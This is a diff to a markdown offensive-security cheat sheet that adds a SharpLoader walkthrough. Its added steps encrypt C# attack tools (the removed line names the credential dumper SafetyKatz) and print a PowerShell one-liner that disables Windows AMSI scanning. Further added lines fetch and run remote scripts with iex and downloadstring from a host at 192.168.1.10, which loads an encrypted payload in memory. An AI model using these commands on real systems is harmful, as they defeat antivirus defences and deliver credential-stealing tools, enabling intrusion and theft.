@@ -532,13 +532,32 @@ IntPtr.Zero, 0, IntPtr.Zero);
 ## SharpLoader
 [Sharploader]('https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader')
 
+- First, encrypt all your csharp files using invoke-sharpEncrypt.
+- Second, Places all your encrypted files on your apache server.
+- Third, Create a powershell script using the amsi string below.
+- Fourth, Run the amsi script before running invoke-sharploader.
+
+<br>
+### 1
 ```csharp
-Invoke-SharpEncrypt -file C:\CSharpFiles\SafetyKatz.exe -password S3cur3Th1sSh1t -outfile C:\CSharpEncrypted\SafetyKatz.enc
+Invoke-SharpEncrypt -file C:\Path\to\file.exe -password SuperDumperStrongPassword -outfile C:\Path\to\file.enc
 ```
 <br>
+### 2
+```powershell
+(([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
+````
 <br>
-
-
+### 3
+```powershell
+iex(new-object net.webclient).downloadstring('http://192.168.1.10/amsi.ps1')
+```
+<br>
+### 4
+```powershell
+iex(new-object net.webclient).downloadstring('http://192.168.1.10/Invoke-SharpLoader.ps1');Invoke-SharpLoader -location https://192.168.1.10/runner.enc -password SuperDumperStrongPassword -noArgs
+```
+<br>
 <br>
 
 # Javascript
